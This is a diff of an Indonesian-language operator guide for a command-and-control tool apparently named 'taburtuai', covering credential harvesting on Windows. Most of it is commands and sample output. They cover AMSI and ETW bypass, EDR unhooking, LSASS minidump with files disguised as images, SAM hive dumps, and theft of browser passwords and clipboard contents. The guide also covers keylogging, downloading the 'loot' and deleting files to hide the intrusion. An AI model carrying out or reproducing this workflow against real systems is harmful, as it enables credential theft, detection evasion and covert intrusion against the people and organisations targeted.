@@ -2,240 +2,323 @@
 
 ## Persiapan Sebelum Credential Harvesting
 
-Sebelum mengambil kredensial, pastikan:
+Sebelum mengambil kredensial, pastikan kondisi berikut:
 
 ```
-# 1. Patch AMSI dan ETW (agar tidak terdeteksi)
-bypass amsi 2703886d --wait
-bypass etw 2703886d --wait
+# 1. Cek privilege saat ini
+taburtuai(IP:8000) › cmd 2703886d "whoami /priv"
+# Minimal butuh SeDebugPrivilege untuk LSASS dump
 
-# 2. Hapus EDR hooks
-evasion unhook 2703886d --wait
+# 2. Bypass AMSI agar PowerShell tidak dideteksi
+taburtuai(IP:8000) › bypass amsi 2703886d --wait
 
-# 3. Cek privilege agent (banyak teknik butuh admin/SYSTEM)
-cmd 2703886d "whoami /priv"
+# 3. Bypass ETW agar tidak ada event logging
+taburtuai(IP:8000) › bypass etw 2703886d --wait
+
+# 4. Unhook NTDLL agar EDR hook tidak interfere
+taburtuai(IP:8000) › evasion unhook 2703886d --wait
 ```
 
 ---
 
-## LSASS Memory Dump
+## LSASS Minidump
 
-**LSASS (Local Security Authority Subsystem Service)** menyimpan credential material
-di memori — termasuk NTLM hash, Kerberos tickets, dan plaintext password (pada sistem
-lama atau konfigurasi tertentu).
+Dump memori proses lsass.exe untuk ekstraksi kredensial. LSASS menyimpan
+credential cache Windows (NTLM hash, Kerberos ticket, cleartext password).
 
-### Dump LSASS ke File
-
-```
-taburtuai(IP:PORT) › creds lsass 2703886d --wait
-```
+### Dump ke Path Default
 
 ```
-[+] Dumping LSASS (PID: 724) via MiniDumpWriteDump...
-[+] LSASS dump saved: C:\Windows\Temp\lsass_1714924512.dmp (84.3 MB)
-[*] Download with: files download 2703886d "C:\Windows\Temp\lsass_1714924512.dmp" ./lsass.dmp
+taburtuai(IP:8000) › creds lsass 2703886d --wait
 ```
 
-### Dengan Output Path Kustom
+**Output:**
+```
+[*] Dumping LSASS memory (PID: 724)...
+[*] Using MiniDumpWriteDump via indirect syscall...
+[+] LSASS dump completed.
+
+    Path : C:\Windows\Temp\lsass.dmp
+    Size : 47,185,920 bytes (44.9 MB)
+
+[i] Download dengan: files download 2703886d "C:\Windows\Temp\lsass.dmp" ./loot/lsass.dmp
+[i] Hapus jejak : files delete 2703886d "C:\Windows\Temp\lsass.dmp"
+```
+
+### Dump ke Path Kustom
 
 ```
-creds lsass 2703886d --output "C:\Users\windows\AppData\Local\Temp\sys.tmp" --wait
+taburtuai(IP:8000) › creds lsass 2703886d \
+  --output "C:\Users\Public\Pictures\thumb.dmp" \
+  --wait
 ```
 
-### Download dan Parse
+**Output:**
+```
+[+] LSASS dump completed.
+    Path: C:\Users\Public\Pictures\thumb.dmp (44.9 MB)
+```
+
+Ekstensi `.dmp` tidak wajib — bisa `.jpg`, `.png`, atau apapun untuk kamuflase.
+
+### Download dan Analisis
 
 ```
 # Download dump ke mesin operator
-files download 2703886d "C:\Windows\Temp\lsass_1714924512.dmp" ./lsass.dmp
+taburtuai(IP:8000) › files download 2703886d \
+  "C:\Windows\Temp\lsass.dmp" \
+  ./loot/lsass.dmp \
+  --timeout 120 \
+  --wait
 
-# Parse dengan mimikatz (di mesin operator, offline)
-mimikatz # sekurlsa::minidump lsass.dmp
-mimikatz # sekurlsa::logonpasswords
+# Ekstraksi dengan pypykatz (di mesin operator, Linux)
+pypykatz lsa minidump ./loot/lsass.dmp
 
-# Atau dengan pypykatz (Linux/macOS)
-pypykatz lsa minidump lsass.dmp
-
-# Atau dengan impacket-secretsdump
-impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+# Atau dengan mimikatz (di Windows operator)
+# sekurlsa::minidump loot\lsass.dmp
+# sekurlsa::logonpasswords
 ```
 
-### OPSEC Notes
-
-- MiniDumpWriteDump adalah API yang sangat dimonitor oleh EDR
-- Lakukan unhook NTDLL sebelum dump untuk bypass EDR hooks
-- Rename file dump agar tidak obvious (`.dmp` ekstensi bisa di-flag)
-- Delete file dump setelah download
-
----
-
-## SAM Database Dump
-
-**SAM (Security Account Manager)** menyimpan hash password akun lokal Windows.
-Bersama SYSTEM hive, kita bisa decrypt dan mendapatkan NTLM hash semua akun lokal.
-
-### Dump SAM, SYSTEM, dan SECURITY
-
+**Output pypykatz (contoh):**
 ```
-taburtuai(IP:PORT) › creds sam 2703886d --wait
-```
-
-```
-[+] Saving registry hives...
-[+] SAM     → C:\Windows\Temp\sam_1714924512
-[+] SYSTEM  → C:\Windows\Temp\system_1714924512
-[+] SECURITY→ C:\Windows\Temp\security_1714924512
-[*] Download all three files for offline cracking.
-```
-
-### Download Hive Files
-
-```
-files download 2703886d "C:\Windows\Temp\sam_1714924512" ./sam
-files download 2703886d "C:\Windows\Temp\system_1714924512" ./system
-files download 2703886d "C:\Windows\Temp\security_1714924512" ./security
+INFO:root:Parsing file ./loot/lsass.dmp
+FILE: ./loot/lsass.dmp ======== 
+== LogonSession ==
+authentication_id 1234567 (0x12d687)
+session_id 1
+username john.doe
+domainname CORP
+logon_server DC01
+logon_time 2026-04-23T08:44:12.000000+00:00
+sid S-1-5-21-1234567890-987654321-1234567890-1001
+	== MSV ==
+		Username: john.doe
+		Domain: CORP
+		LM: NA
+		NT: aad3b435b51404eeaad3b435b51404ee:e10adc3949ba59abbe56e057f20f883e
+		SHA1: c1328472a5f52d7f10a8a3b8c4a98d7e3b4e5f6a
+	== WDIGEST [12d687]==
+		username john.doe
+		domainname CORP
+		password 5ecureP@ssword2026!
+	== Kerberos ==
+		Username: john.doe
+		Domain: CORP.LOCAL
 ```
 
-### Parse Hive Files
+### Hapus Jejak
 
-```bash
-# Dengan impacket-secretsdump (di mesin operator Linux)
-impacket-secretsdump -sam sam -system system -security security LOCAL
-
-# Output:
-# [*] Target system bootKey: 0xa1b2c3d4e5f6...
-# [*] Dumping local SAM hashes (uid:rid:lmhash:nthash):
-# Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
-# Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-# windows:1001:aad3b435b51404eeaad3b435b51404ee:1a1dc91c907325c69271ddf0c944bc72:::
-
-# Crack dengan hashcat
-hashcat -m 1000 hashes.txt wordlist.txt
+```
+taburtuai(IP:8000) › files delete 2703886d "C:\Windows\Temp\lsass.dmp" --wait
+# [+] File deleted.
 ```
 
 ---
 
-## Browser Password Harvesting
+## SAM/SYSTEM/SECURITY Hive Dump
 
-Kumpulkan saved password dari browser populer. Taburtuai mengakses encrypted credential
-store browser dan decrypt menggunakan Windows DPAPI.
+Dump registry hive SAM, SYSTEM, dan SECURITY untuk ekstraksi password hash lokal.
+Tidak butuh LSASS — bisa dilakukan tanpa SeDebugPrivilege.
 
-### Dump Browser Credentials
-
-```
-taburtuai(IP:PORT) › creds browser 2703886d --wait
-```
+### Dump Registry Hive
 
 ```
-[+] Harvesting browser credentials...
-    Chrome : 47 credentials found
-    Edge   : 23 credentials found
-    Brave  : 8 credentials found
-    Firefox: 12 credentials found
-
-[+] Results:
-URL                              USERNAME          PASSWORD
----------------------------------------------------------------
-https://mail.company.com         john.doe          P@ssword2026
-https://vpn.company.com          jdoe@company.com  SecretVPN123
-https://jira.company.com         john.doe          Jira2026!
-https://github.com               johndoe-dev       ghp_xxxxxxxxxxxx
-...
+taburtuai(IP:8000) › creds sam 2703886d --wait
 ```
 
-### Browser yang Didukung
+**Output:**
+```
+[*] Dumping registry hives...
+[*] Saving SAM hive     → C:\Windows\Temp\sam.hive
+[*] Saving SYSTEM hive  → C:\Windows\Temp\system.hive
+[*] Saving SECURITY hive→ C:\Windows\Temp\security.hive
+[+] Registry hives dumped.
 
-| Browser | Data yang Diambil |
-|---|---|
-| Google Chrome | Login Data, Cookies, Credit Cards |
-| Microsoft Edge | Login Data, Cookies |
-| Brave Browser | Login Data, Cookies |
-| Mozilla Firefox | logins.json + key4.db (DPAPI) |
+    sam.hive     : 65,536 bytes
+    system.hive  : 12,288,000 bytes
+    security.hive: 262,144 bytes
+```
 
-### Cara Kerja
+### Ke Direktori Kustom
 
-- **Chromium-based** (Chrome, Edge, Brave): Decrypt menggunakan `CryptUnprotectData` Windows DPAPI dengan Local Machine key + browser-specific master key dari `Local State` file
-- **Firefox**: Decrypt menggunakan Network Security Services (NSS) library dengan master password default (kosong)
+```
+taburtuai(IP:8000) › creds sam 2703886d \
+  --output-dir "C:\Users\Public\Documents" \
+  --wait
+```
+
+### Download dan Analisis
+
+```
+# Download ketiga file
+taburtuai(IP:8000) › files download 2703886d "C:\Windows\Temp\sam.hive" ./loot/sam.hive --wait
+taburtuai(IP:8000) › files download 2703886d "C:\Windows\Temp\system.hive" ./loot/system.hive --wait
+taburtuai(IP:8000) › files download 2703886d "C:\Windows\Temp\security.hive" ./loot/security.hive --wait
+
+# Ekstraksi hash dengan secretsdump (impacket)
+python3 -m impacket.examples.secretsdump \
+  -sam ./loot/sam.hive \
+  -system ./loot/system.hive \
+  -security ./loot/security.hive \
+  LOCAL
+```
+
+**Output secretsdump:**
+```
+[*] Target system bootKey: 0x3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+john.doe:1001:aad3b435b51404eeaad3b435b51404ee:e10adc3949ba59abbe56e057f20f883e:::
+[*] Dumping cached domain logon information (domain/username:hash)
+CORP/john.doe:$DCC2$10240#john.doe#8a7b9c0d1e2f3a4b5c6d7e8f9a0b1c2d
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC
+ CORP\DESKTOP-QLPBF95$:plain_password_hex:...
+[*] DPAPI_SYSTEM
+dpapi_machinekey: 0xa1b2c3d4e5f6...
+dpapi_userkey   : 0x1a2b3c4d5e6f...
+```
+
+### Hapus Jejak
+
+```
+taburtuai(IP:8000) › files delete 2703886d "C:\Windows\Temp\sam.hive" --wait
+taburtuai(IP:8000) › files delete 2703886d "C:\Windows\Temp\system.hive" --wait
+taburtuai(IP:8000) › files delete 2703886d "C:\Windows\Temp\security.hive" --wait
+```
+
+---
+
+## Browser Credential Harvest
+
+Ambil password tersimpan dari browser populer (Chrome, Edge, Firefox, Brave, Opera).
+
+```
+taburtuai(IP:8000) › creds browser 2703886d --wait
+```
+
+**Output:**
+```
+[*] Harvesting browser credentials...
+[*] Checking Chrome...
+[*] Checking Microsoft Edge...
+[*] Checking Firefox...
+[*] Checking Brave...
+[+] Credential harvest completed.
+
+    CHROME (32 entries):
+    ─────────────────────────────────────────────────────────
+    URL            : https://mail.corp.local
+    Username       : john.doe@corp.local
+    Password       : CorpMail@2026!
+    
+    URL            : https://github.com
+    Username       : johndoe-dev
+    Password       : ghp_abc123xyz456...
+    
+    URL            : https://192.168.1.1
+    Username       : admin
+    Password       : router123
+
+    MICROSOFT EDGE (8 entries):
+    ─────────────────────────────────────────────────────────
+    URL            : https://portal.azure.com
+    Username       : john.doe@corp.onmicrosoft.com
+    Password       : AzureAdmin2026!
+
+    FIREFOX (4 entries):
+    ─────────────────────────────────────────────────────────
+    URL            : https://vpn.corp.local
+    Username       : john.doe
+    Password       : VPN_S3cur3!
+```
 
 ---
 
 ## Clipboard Read
 
-Ambil konten clipboard saat ini. Berguna kalau target sedang copy-paste password atau
-data sensitif.
+Ambil konten clipboard target saat ini.
 
 ```
-taburtuai(IP:PORT) › creds clipboard 2703886d --wait
+taburtuai(IP:8000) › creds clipboard 2703886d --wait
 ```
 
+**Output (clipboard kosong):**
 ```
-[+] Clipboard content:
-    Type: Text (1847 chars)
-    
-    Content:
-    -----BEGIN RSA PRIVATE KEY-----
-    MIIEowIBAAKCAQEA...
-    -----END RSA PRIVATE KEY-----
+[+] Clipboard content: (empty)
 ```
 
-### Kapan Berguna
+**Output (ada konten):**
+```
+[+] Clipboard content (127 bytes):
 
-- Target sedang pakai password manager → copy password ke clipboard
-- Developer copy API key atau secret
-- Target copy isi dokumen sensitif
-- Target copy kredensial untuk paste ke terminal
+Creds: admin / P@ssw0rd123!
+Server: db-prod.corp.local:5432
+DB: production_db
+```
 
-### Continuous Monitoring
+### Gunakan dengan Keylogger
 
-Untuk monitoring clipboard secara terus-menerus, kombinasi dengan keylogger:
+Kombinasikan clipboard monitoring dengan keylogger untuk intersepsi credential yang di-copy-paste:
 
 ```
-# Start keylogger (rekam keyboard + clipboard)
-keylog start 2703886d --duration 300  # 5 menit
+# Start keylogger
+taburtuai(IP:8000) › keylog start 2703886d --duration 300 --wait
 
-# ... tunggu beberapa saat ...
+# Setelah beberapa menit, dump keystrokes
+taburtuai(IP:8000) › keylog dump 2703886d --wait
 
-# Ambil data
-keylog dump 2703886d
-
-# Stop
-keylog stop 2703886d
+# Sekaligus ambil clipboard
+taburtuai(IP:8000) › creds clipboard 2703886d --wait
 ```
 
 ---
 
-## Scenario: Full Credential Harvest
+## Skenario: Credential Harvesting Lengkap
 
-```
-# 1. Persiapan
+```bash
+# ── Persiapan ─────────────────────────────────────────────
 bypass amsi 2703886d --wait
-bypass etw 2703886d --wait
+bypass etw  2703886d --wait
 evasion unhook 2703886d --wait
 
-# 2. Cek privilege
-cmd 2703886d "whoami /priv"
-# Pastikan ada SeDebugPrivilege
+# ── LSASS dump ────────────────────────────────────────────
+creds lsass 2703886d --output "C:\Temp\debug.dmp" --wait
+files download 2703886d "C:\Temp\debug.dmp" ./loot/lsass.dmp --timeout 120 --wait
+files delete 2703886d "C:\Temp\debug.dmp" --wait
 
-# 3. Dump LSASS
-creds lsass 2703886d --wait
+# ── SAM dump ──────────────────────────────────────────────
+creds sam 2703886d --output-dir "C:\Temp" --wait
+files download 2703886d "C:\Temp\sam.hive" ./loot/sam.hive --wait
+files download 2703886d "C:\Temp\system.hive" ./loot/system.hive --wait
+files download 2703886d "C:\Temp\security.hive" ./loot/security.hive --wait
+files delete 2703886d "C:\Temp\sam.hive" --wait
+files delete 2703886d "C:\Temp\system.hive" --wait
+files delete 2703886d "C:\Temp\security.hive" --wait
 
-# 4. Dump SAM
-creds sam 2703886d --wait
-
-# 5. Browser passwords
+# ── Browser creds ──────────────────────────────────────────
 creds browser 2703886d --wait
 
-# 6. Clipboard (kalau user sedang aktif)
+# ── Clipboard ─────────────────────────────────────────────
 creds clipboard 2703886d --wait
 
-# 7. Download semua hasil
-files download 2703886d "C:\Windows\Temp\lsass_*.dmp" ./lsass.dmp
-files download 2703886d "C:\Windows\Temp\sam_*" ./sam
-files download 2703886d "C:\Windows\Temp\system_*" ./system
-files download 2703886d "C:\Windows\Temp\security_*" ./security
-
-# 8. Cleanup
-cmd 2703886d "del C:\Windows\Temp\lsass_* && del C:\Windows\Temp\sam_* && del C:\Windows\Temp\system_* && del C:\Windows\Temp\security_*"
+# ── Analisis di mesin operator ─────────────────────────────
+# pypykatz lsa minidump ./loot/lsass.dmp
+# python3 -m impacket.examples.secretsdump -sam ... LOCAL
 ```
+
+---
+
+## Troubleshooting
+
+| Error | Penyebab | Solusi |
+|-------|----------|--------|
+| `Access denied` (LSASS) | Tidak ada SeDebugPrivilege | Escalate privilege dulu |
+| `Protected process` (LSASS) | PPL aktif | Gunakan driver PPL bypass atau indirect syscall |
+| `Access denied` (SAM) | Tidak ada admin | Escalate ke admin/SYSTEM |
+| Browser decrypt failed | DPAPI key tidak cocok | Jalankan sebagai user yang sama dengan browser |
+| Clipboard empty | Tidak ada yang di-copy | Tunggu dan coba lagi, atau kombinasi dengan keylogger |
 
 ---
 
